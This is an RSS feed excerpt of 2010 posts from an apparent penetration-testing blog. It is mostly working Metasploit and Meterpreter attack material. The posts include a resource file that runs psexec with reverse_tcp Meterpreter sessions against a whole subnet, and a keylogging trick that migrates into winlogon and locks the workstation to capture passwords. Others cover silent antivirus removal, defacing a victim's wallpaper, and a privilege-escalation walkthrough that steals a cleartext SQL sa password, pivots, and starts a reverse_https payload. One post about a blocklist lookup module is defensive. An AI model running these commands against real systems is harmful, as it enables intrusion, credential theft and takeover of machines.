&lt;p&gt;Enjoy!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Project Honeypot HTTP Blocklist module</title>
      <link>https://malicious.link/post/2010/2010-12-23-project-honeypot-http-blocklist-module/</link>
      <pubDate>Thu, 23 Dec 2010 23:39:03 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-12-23-project-honeypot-http-blocklist-module/</guid>
      <description>&lt;p&gt;Most malicious IP lists focus on the client side threat, where servers (hosted or exploited) host client side exploits or evil scripting.&lt;/p&gt;

&lt;p&gt;These don&amp;rsquo;t really help the server admins very much. Project Honeypot does an amazing job at keeping detailed information on scanners / harvesters and brute forcers, the likes of which are the daily enemy of said admins. They offer a service called HTTP Block List or &amp;lsquo;HTTP:BL&amp;rsquo;.&lt;/p&gt;

&lt;p&gt;Another way this list differs from the rest is it isn&amp;rsquo;t a list you can download. Its a DNS service. Simply put, you submit a query, it gives an (A) record that looks something like &amp;lsquo;127.3.5.1&amp;rsquo;. Disregard the 127, but the rest of the details pertain to different details about the IP you requested. You can read the documentation here: &lt;a href=&#34;http://www.projecthoneypot.org/httpbl_api.php&#34;&gt;http://www.projecthoneypot.org/httpbl_api.php&lt;/a&gt; for an explanation on exactly how it works, or you can read the code of the Metasploit module I wrote for it.&lt;/p&gt;

&lt;p&gt;I wrote it in Metasploit for 2 reasons. 1) RangeWalker is awesome code, and allows you to query a list of IPs, a range, or a single IP with ease. 2) All of the other implementations of the API that they have listed are for CMSs (to actively block IPs that come back &amp;lsquo;bad&amp;rsquo;).&lt;/p&gt;

&lt;p&gt;This will mostly come in useful for incident responders who are trying to get a bead on a bunch of hosts, or for web admins who want to pull the code out for an active blocking system of their own.&lt;/p&gt;

&lt;p&gt;Here it is in action:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(httpbl_lookup) &amp;gt; info

       Name: Http:BL lookup
    Version: xxxx
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Rob Fuller 

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  APIKEY   xxxxxxxxxxxx     yes       Your HTTP:BL api key
  RHOSTS   88.229.108.0/24  yes       The target address range or CIDR identifier
  THREADS  1                yes       The number of concurrent threads

Description:
  This module can be used to enumerate information about a IP 
  addresses from Project HoneyPot&#39;s HTTP Block List.

References:
  link (&amp;lt;a href=&amp;quot;http://www.projecthoneypot.org/httpbl_api.php&amp;quot;&amp;gt;http://www.projecthoneypot.org/httpbl_api.php&amp;lt;/a&amp;gt;)

msf auxiliary(httpbl_lookup) &amp;gt; run

[*] 
[*] 88.229.108.0 resloves to 127.51.8.1 which means: Suspicious
[*] =&amp;gt; it was last seen 51 day ago and has a threat score of 8 or &#39;less than 100 spam messages&#39;
[*] =&amp;gt; more info here: &amp;lt;a href=&amp;quot;http://www.projecthoneypot.org/ip_88.229.108.0&amp;quot;&amp;gt;http://www.projecthoneypot.org/ip_88.229.108.0&amp;lt;/a&amp;gt;

[*] 
[*] 88.229.108.1 resloves to 127.29.8.1 which means: Suspicious
[*] =&amp;gt; it was last seen 29 day ago and has a threat score of 8 or &#39;less than 100 spam messages&#39;
[*] =&amp;gt; more info here: &amp;lt;a href=&amp;quot;http://www.projecthoneypot.org/ip_88.229.108.1&amp;quot;&amp;gt;http://www.projecthoneypot.org/ip_88.229.108.1&amp;lt;/a&amp;gt;

[*] 
[*] 88.229.108.2 resloves to 127.29.8.1 which means: Suspicious
[*] =&amp;gt; it was last seen 29 day ago and has a threat score of 8 or &#39;less than 100 spam messages&#39;
[*] =&amp;gt; more info here: &amp;lt;a href=&amp;quot;http://www.projecthoneypot.org/ip_88.229.108.2&amp;quot;&amp;gt;http://www.projecthoneypot.org/ip_88.229.108.2&amp;lt;/a&amp;gt;

[*] 
[*] 88.229.108.254 resloves to 127.51.8.1 which means: Suspicious
[*] =&amp;gt; it was last seen 51 day ago and has a threat score of 8 or &#39;less than 100 spam messages&#39;
[*] =&amp;gt; more info here: &amp;lt;a href=&amp;quot;http://www.projecthoneypot.org/ip_88.229.108.254&amp;quot;&amp;gt;http://www.projecthoneypot.org/ip_88.229.108.254&amp;lt;/a&amp;gt;

[*] 
[*] 88.229.108.255 resloves to 127.29.8.1 which means: Suspicious
[*] =&amp;gt; it was last seen 29 day ago and has a threat score of 8 or &#39;less than 100 spam messages&#39;
[*] =&amp;gt; more info here: &amp;lt;a href=&amp;quot;http://www.projecthoneypot.org/ip_88.229.108.255&amp;quot;&amp;gt;http://www.projecthoneypot.org/ip_88.229.108.255&amp;lt;/a&amp;gt;

[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(httpbl_lookup) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can obtain the module here: &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/metasploit/httpbl_lookup.rb&#34;&gt;https://github.com/mubix/stuff/blob/master/metasploit/httpbl_lookup.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Enjoy!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Silently uninstall SEP</title>
      <link>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</link>
      <pubDate>Tue, 16 Nov 2010 05:00:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</guid>
      <description>&lt;p&gt;Uninstallation is not new&lt;/p&gt;

&lt;p&gt;Deleting and removing things on a box you own isn&amp;rsquo;t new&lt;/p&gt;

&lt;p&gt;This method and how to do it remotely was &lt;a href=&#34;http://it.toolbox.com/blogs/locutus/how-to-silently-and-remotely-remove-symantec-antivirus-14625&#34;&gt;posted in Feb 2007&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But I didn&amp;rsquo;t know how to do it, and I thought it was hilarious, so I made a video:&lt;/p&gt;

&lt;iframe width=&#34;420&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/tkoApCp8rQ4&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Am I an Admin? Railgun Script</title>
      <link>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</link>
      <pubDate>Mon, 13 Sep 2010 17:45:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</guid>
      <description>&lt;p&gt;When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.&lt;/p&gt;

&lt;p&gt;But, I wanted to make a way that check a bunch of sessions all at once. So I wrote &amp;ldquo;AmIAdmin.rb&amp;rdquo; which uses meterpreter&amp;rsquo;s railgun extension to execute &amp;ldquo;IsUserAdmin&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Being that Shell32.dll isn&amp;rsquo;t included in railgun by default we have to add it. After writing it I decided to add some checks. These checks make sure that each piece of the script isn&amp;rsquo;t already loaded. It&amp;rsquo;s a good reference for doing this in the future.&lt;/p&gt;

&lt;p&gt;(you can remove the print_status lines if you want the script to be quieter)&lt;/p&gt;

&lt;p&gt;Here is the script for your consumption:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;if client.platform == &amp;quot;x64/win32&amp;quot;        
	print_status &amp;quot;Railgun is currently not supported for x64 bit systems&amp;quot;         
raise Rex::Script::Completed        
end

if client.railgun.present? == true       
	print_status &amp;quot;Railgun already loaded.. skipping&amp;quot;         
else        
	print_status &amp;quot;Loading Railgun&amp;quot;         
	client.core.use(&amp;quot;railgun&amp;quot;)        
end

if client.railgun.dll[&#39;shell32&#39;] == nil       
	print_status &amp;quot;Adding Shell32.dll&amp;quot;         
	client.railgun.add_dll(&#39;shell32&#39;,&#39;shell32&#39;)        
else        
	print_status &amp;quot;Shell32 already loaded.. skipping&amp;quot;         
end

if (client.railgun.shell32.functions[&#39;IsUserAnAdmin&#39;] == nil       
	print_status &amp;quot;Adding the IsUserAnAdmin function&amp;quot;         
	client.railgun.add_function(&#39;shell32&#39;, &#39;IsUserAnAdmin&#39;, &#39;BOOL&#39;, [])        
else        
	print_status &amp;quot;IsUserAnAdmin already loaded.. skipping&amp;quot;         
end

print_status &amp;quot;Running the IsUserAnAdmin function&amp;quot;        
status = client.railgun.shell32.IsUserAnAdmin()

if status[&amp;quot;return&amp;quot;] == true then       
	print_status &amp;quot;You are an administrator&amp;quot;         
else        
	print_error &amp;quot;You are not an administrator&amp;quot;         
end
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Rapid fire PSEXEC for Metasploit</title>
      <link>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</link>
      <pubDate>Sun, 12 Sep 2010 15:06:39 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</guid>
      <description>&lt;p&gt;Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.&lt;/p&gt;

&lt;p&gt;// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&amp;rsquo;ve broken it up into sections. Also take note of the &amp;ldquo;setg&amp;rdquo; which sets the variable globally so that I don&amp;rsquo;t have to set it inside of the psexec module.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use multi/handler  
setg PAYLOAD windows/meterpreter/reverse_tcp  
setg LHOST 192.168.1.114  
setg LPORT 80  
set ExitOnSession false

exploit -j -z
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn&amp;rsquo;t have to set up and tear down the handler. = fast. The following though is just the setup for the module.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use windows/smb/psexec  
set SMBUser Administrator  
set SMBPass password123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren&amp;rsquo;t joined to a domain they can take pretty much anything here.&lt;/p&gt;

&lt;p&gt;However if they are actually joined to a domain, you either have to have the computer name (which definitely won&amp;rsquo;t play well with a scanner easily) or use domain credentials.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;set SMBDomain .
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &amp;ldquo;.&amp;rdquo; is something every Windows API programmer would know as it&amp;rsquo;s really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won&amp;rsquo;t take either localhost or 127.0.0.1.&lt;/p&gt;

&lt;p&gt;Next up, we don&amp;rsquo;t want each run of the exploit module to build the multi/handler and tear it down every single run. That&amp;rsquo;s why we built it first and set DisablePayloadHandler inside of the psexec module.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;set DisablePayloadHandler true
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the &lt;code&gt;&amp;lt;ruby&amp;gt;&lt;/code&gt; html like block identifier you can then use the power of Ruby combined with Rex (Metasploit&amp;rsquo;s API) to do really cool stuff.&lt;/p&gt;

&lt;p&gt;More setup, but this time for the ruby portion. Using Metasploit&amp;rsquo;s RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the &amp;ldquo;file:&amp;rdquo; prefix.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;&amp;lt;ruby&amp;gt;  
require &#39;rex/socket/range_walker&#39;  
rhosts = &amp;quot;192.168.92.0/24&amp;quot;  
iplist = Rex::Socket::RangeWalker.new(rhosts)  
iplist.each do |rhost|
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, we&amp;rsquo;ve included RangeWalker, parsed it, and loaded it into an &amp;lsquo;each&amp;rsquo; for loop.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;self.run_single&lt;/code&gt; function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;	self.run_single(&amp;quot;set RHOST #{rhost}&amp;quot;)  
	self.run_single(&amp;quot;exploit -j -z&amp;quot;)
end  
&amp;lt;/ruby&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the &amp;ldquo;-z -j&amp;rdquo; just as we did with multi/handler.&lt;/p&gt;

&lt;p&gt;Now, if your credentials worked on any of the IPs you&amp;rsquo;ll have sessions waiting for you.&lt;/p&gt;

&lt;p&gt;This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!.&lt;/p&gt;

&lt;p&gt;Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of  CTF competitions.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit turns 10,000</title>
      <link>https://malicious.link/post/2010/2010-08-13-metasploit-turns-10000/</link>
      <pubDate>Fri, 13 Aug 2010 16:36:46 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-08-13-metasploit-turns-10000/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201008_10k_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Ask any developer and they will tell you that the age of a project is not calculated in calendar time, but in worker hours or &amp;ldquo;commits&amp;rdquo; to a project. The Metasploit Framework hit 10,000 today.&lt;/p&gt;

&lt;p&gt;With the project dating back to 2003, much before the official &amp;ldquo;Revision 1&amp;rdquo; happened, there have been a lot of changes. Going from the initial incarnation as a network &amp;ldquo;game&amp;rdquo; written in perl to the world largest ruby project, the framework has seen it&amp;rsquo;s fair share of blood, sweat, and tears. With Express out and Pro to come, there will definitely be 10,000 more.&lt;/p&gt;

&lt;p&gt;Congratulations to the team, both past and present. What you guys do is extraordinary.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Intro to RailGun: WIN API for Meterpreter</title>
      <link>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</link>
      <pubDate>Thu, 08 Jul 2010 02:10:34 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</guid>
      <description>

&lt;p&gt;Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&#34;&gt;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:
&lt;a href=&#34;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&#34;&gt;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;iphlpapi&lt;/li&gt;
&lt;li&gt;ws2_32&lt;/li&gt;
&lt;li&gt;kernel32&lt;/li&gt;
&lt;li&gt;ntdll&lt;/li&gt;
&lt;li&gt;user32&lt;/li&gt;
&lt;li&gt;advapi32&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(You can find out exactly what functions are available by default in the api.rb file)&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s also very extensible, it doesn&amp;rsquo;t have a DLL or function you need? But you can read all about in the manual:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Here are two examples where this comes in very handy:&lt;/p&gt;

&lt;h2 id=&#34;list-drives&#34;&gt;List Drives:&lt;/h2&gt;

&lt;p&gt;The problem that I&amp;rsquo;ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;net use - Shows you what Network drives are connected, but not physical ones&lt;/li&gt;
&lt;li&gt;fsutil fsinfo drives - You must be an administrator to ride this train&lt;/li&gt;
&lt;li&gt;fdisk /status - Only on OLD versions of DOS, not sure when this disappeared&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But railgun solves this problem with a really short script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;# Load the Railgun plugin  **_Update: You no longer need this step_**  
# client.core.use(&amp;quot;railgun&amp;quot;)   
# Make the API call to enum drive letters   
a = client.railgun.kernel32.GetLogicalDrives()[&amp;quot;return&amp;quot;]         
# Math magic to convert the binary to letters        
drives = []         
letters = &amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;         
(0..25).each do |i|        
	test = letters[i,1]        
	rem = a % (2**(i+1))        
	if rem &amp;gt; 0        
		drives &amp;lt;&amp;lt; test        
		a = a - rem        
	end        
end         
print_line(&amp;quot;Drives Available = #{drives.inspect}&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;: &lt;code&gt;Drives Available = [&amp;quot;A&amp;quot;, &amp;quot;C&amp;quot;, &amp;quot;D&amp;quot;, &amp;quot;P&amp;quot;, &amp;quot;X&amp;quot;]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Save this as a meterpreter script and it&amp;rsquo;ll print every logical drive attached to the system even as a limited user (that the user can see).&lt;/p&gt;

&lt;p&gt;Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drivesâ¦&lt;/p&gt;

&lt;h2 id=&#34;jedi-keylogging&#34;&gt;JEDI KEYLOGGING:&lt;/h2&gt;

&lt;p&gt;One of the problems with keylogging is you never know when that person will log in, and if you&amp;rsquo;re using a client side, they have probably already logged in and you&amp;rsquo;re hoping they log into a portal or some other password protected site.&lt;/p&gt;

&lt;p&gt;Railgun to the rescue again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;# Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon**   

meterpreter &amp;gt; bgrun keylogrecorder -c 1 -t 15        
[*] Executed Meterpreter with Job ID 0        
meterpreter &amp;gt; [*] winlogon.exe Process found, migrating into 640        
[*] Migration Successful!!        
[*] Starting the keystroke sniffer...        
[*] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt        
[*] Recording         
  
# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.**

meterpreter &amp;gt; irb       
[*] Starting IRB shell        
[*] The &#39;client&#39; variable holds the meterpreter client

client.core.use(&amp;quot;railgun&amp;quot;)       
=&amp;gt; true        
client.railgun.user32.LockWorkStation()        
=&amp;gt; {&amp;quot;GetLastError&amp;quot;=&amp;gt;0, &amp;quot;return&amp;quot;=&amp;gt;true}        
exit        
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Set up &amp;ldquo;tail -f&amp;rdquo; going on the log file for the keylogger and then kill the keylogger when you&amp;rsquo;ve gotten what you came for.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; bglist       
[*] Job 0: [&amp;quot;keylogrecorder&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;1&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;15&amp;quot;]        
meterpreter &amp;gt; bgkill 0        
[*] Killing background job 0...        
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hope you have fun with railgun and shoot me an email &lt;a href=&#34;mailto:mubix@hak5.org&#34;&gt;mubix@hak5.org&lt;/a&gt; or leave a comment if you have any other crazy uses for railgun.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Set Wallpaper Meterpreter Script</title>
      <link>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</link>
      <pubDate>Mon, 28 Jun 2010 20:34:43 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</guid>
      <description>&lt;p&gt;Certainly nothing to fuss over, but I&amp;rsquo;ve had a fascination with setting my target&amp;rsquo;s wallpaper as sort of a calling card for years now. I&amp;rsquo;ve been able to set the registry key (HKCUControl PanelDesktopWallpaper), but until recently I didn&amp;rsquo;t know how to get it to refresh so that it displayed without forcing the user to log out&amp;hellip;&lt;/p&gt;

&lt;p&gt;First, is the most important part, selection of the wallpaper. This is my first selection:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201006_wallpaper_1.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;But, it has to be a BMP. So, I created:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://malicious.link/images/metasploit_1024.bmp&#34;&gt;metasploit_1024.bmp&lt;/a&gt; (2.3 MB)&lt;/p&gt;

&lt;p&gt;next run:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;reg add &amp;quot;HKCU\Control Panel\Desktop&amp;quot; /v Wallpaper /t REG_MULTI_SZ /d &amp;quot;C:\metasploit_1024.bmp&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and finally the magic:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;rundll32.exe user32.dll,UpdatePerUserSystemParameters&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;thats it, run that, and it&amp;rsquo;ll refresh the settings and display the wallpaper in all of it&amp;rsquo;s glory. But I wouldn&amp;rsquo;t be a metasploit dog if I didn&amp;rsquo;t make it into a meterpreter script:&lt;/p&gt;

&lt;p&gt;download: &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/metasploit/wallpaper.rb&#34;&gt;wallpaper.rb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;it&amp;rsquo;s definitely not ready to be in the trunk, but it works, just edit each of the options in the file to point at the bmp you want on the victim&amp;rsquo;s wallpaper and it&amp;rsquo;ll be there.&lt;/p&gt;

&lt;p&gt;Todo:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Make each parameter an option so there is no text editing involved&lt;/li&gt;
&lt;li&gt;Add the ability to convert other image types on the fly&lt;/li&gt;
&lt;li&gt;Figure out how to get the desktop color to refresh with the wallpaper&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>0Exploit Privilege Escalation</title>
      <link>https://malicious.link/post/2010/2010-05-07-exploit-privilege-escalation/</link>
      <pubDate>Fri, 07 May 2010 14:05:53 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-05-07-exploit-privilege-escalation/</guid>
      <description>&lt;p&gt;The other day &lt;a href=&#34;http://carnal0wange.attackresearch.com/&#34;&gt;Chris Gates&lt;/a&gt; posted an &lt;a href=&#34;http://carnal0wnage.attackresearch.com/node/417&#34;&gt;excellent blog post&lt;/a&gt; about the WebDAV hotness that &lt;a href=&#34;http://twitter.com/chrissullo&#34;&gt;Chris Sullo&lt;/a&gt; (author of &lt;a href=&#34;http://cirt.net/Nikto2&#34;&gt;Nikto&lt;/a&gt;) cooked up (&lt;a href=&#34;http://security.sunera.com/2010/04/davtest-quickly-test-exploit-webdav.html&#34;&gt;DAVTest&lt;/a&gt;) which &lt;a href=&#34;http://twitter.com/sussurro&#34;&gt;Ryan Linn&lt;/a&gt; popped out a &lt;a href=&#34;http://trac.happypacket.net/browser/msfmods/trunk/modules/auxiliary/scanner/http/webdav_test.rb&#34;&gt;Metasploit module&lt;/a&gt; for.&lt;/p&gt;

&lt;p&gt;Anyways, the story left off being a very limited user called &amp;ldquo;Network Service&amp;rdquo;. This user has Read and Execute, but no Write access, and a very limited field of view to boot.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
Server username: **NT AUTHORITYNETWORK SERVICE**
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets look around a bit..&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; pwd

C:\Inetpub\wwwroot

meterpreter &amp;gt; ls

Listing: C:\Inetpub\wwwroot
===========================
Mode  Size  Type  Last modified  Name
----  ----  ----  -------------  ----
40777/rwxrwxrwx  0  dir  Fri May 07 09:32:19 -0400 2010  .
40777/rwxrwxrwx  0  dir  Mon May 03 12:51:48 -0400 2010  ..
40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  admin
100666/rw-rw-rw-  1587  fil  Sat Dec 08 23:01:24 -0500 2001  default.asp
100666/rw-rw-rw-  1465  fil  Sat Dec 08 23:01:24 -0500 2001  default.css
100666/rw-rw-rw-  3295  fil  Thu Jan 03 12:40:48 -0500 2002  forgotpass.asp
40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  images
40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  language
100666/rw-rw-rw-  1802  fil  Thu Jan 24 12:10:04 -0500 2002  logoff.asp
100666/rw-rw-rw-  7785  fil  Sat Jun 15 19:49:20 -0400 2002  logon.asp
100666/rw-rw-rw-  1801  fil  Mon May 03 12:42:45 -0400 2010  settings.asp
100666/rw-rw-rw-  21137  fil  Wed Aug 28 11:31:42 -0400 2002  setup.asp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sweet! a &amp;ldquo;settings.asp&amp;rdquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; cat settings.asp

&amp;lt;SCRIPT LANGUAGE = &amp;quot;VBScript&amp;quot;&amp;gt;
&amp;lt;(editorial snip)&amp;gt;
SQLUser = &amp;quot;sa&amp;quot;
SQLPass = &amp;quot;SuperDuper#@rdP@$$w0rd2012&amp;quot;
&amp;lt;(/editorial snip)&amp;gt;
&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SA with clear text password. Good luck bruteforcing that one. But they block 1433 directly to the box so direct SQL queries are out. No problem.&lt;/p&gt;

&lt;p&gt;Pivoting to the rescue:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt;
Background session 1? [y/N] 

msf exploit(handler) &amp;gt; route add 192.168.56.0 255.255.255.0 1

msf exploit(handler) &amp;gt; route print

Active Routing Table
====================
Subnet  Netmask  Gateway
------  -------  -------
192.168.56.0  255.255.255.0  Session 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we use mssql_login to check to see if our creds are right (set BLANK_PASSWORDS to false since we already know the password and we aren&amp;rsquo;t trying to brute force it). This will be routed through our meterpreter session that has NETWORK SERVICE permissions.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf exploit(handler) &amp;gt; use scanner/mssql/mssql_login
msf auxiliary(mssql_login) &amp;gt; set BLANK_PASSWORDS false
BLANK_PASSWORDS =&amp;gt; false

msf auxiliary(mssql_login) &amp;gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012
PASSWORD =&amp;gt; SuperDuper#@rdP@$$w0rd2012

msf auxiliary(mssql_login) &amp;gt; set RHOSTS 192.168.56.3
RHOSTS =&amp;gt; 192.168.56.3

msf auxiliary(mssql_login) &amp;gt; run

[*] 192.168.56.3:1433 - MSSQL - Trying username:&#39;sa&#39; with password:&#39;SuperDuper#@rdP@$$w0rd2012&#39;

[+] 192.168.56.3:1433 - MSSQL - successful login &#39;sa&#39; : &#39;SuperDuper#@rdP@$$w0rd2012&#39;

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cool. Now some enumeration and check to see if xp_cmdshell is enabled (it outputs a lot of info so I cut it down to just the pieces we are looking for):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf exploit(mssql_login) &amp;gt; use admin/mssql/mssql_enum
msf auxiliary(mssql_enum) &amp;gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012
PASSWORD =&amp;gt; SuperDuper#@rdP@$$w0rd2012

msf auxiliary(mssql_enum) &amp;gt; set RHOST 192.168.56.3
RHOST =&amp;gt; 192.168.56.3

msf auxiliary(mssql_enum) &amp;gt; run
[*] Running MS SQL Server Enumeration...

[*] Version:
[*] Microsoft SQL Server  2000 - 8.00.194 (Intel X86)
[*] Aug  6 2000 00:57:48
[*] Copyright (c) 1988-2000 Microsoft Corporation
[*] Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)

&amp;lt;(editorial snip)&amp;gt;

[*] xp_cmdshell is Enabled

&amp;lt;(/editorial snip)&amp;gt;

[*] Instances found on this server:
[*]  MSSQLSERVER
[*] Default Server Instance SQL Server Service is running under the privilege of:
[*] LocalSystem
[*] Auxiliary module execution completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;XP_CMDSHELL and the server runs as local system. Looking good, payload time.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(mssql_enum) &amp;gt; use windows/mssql/mssql_payload
msf exploit(mssql_payload) &amp;gt; set PAYLOAD windows/meterpreter/reverse_https
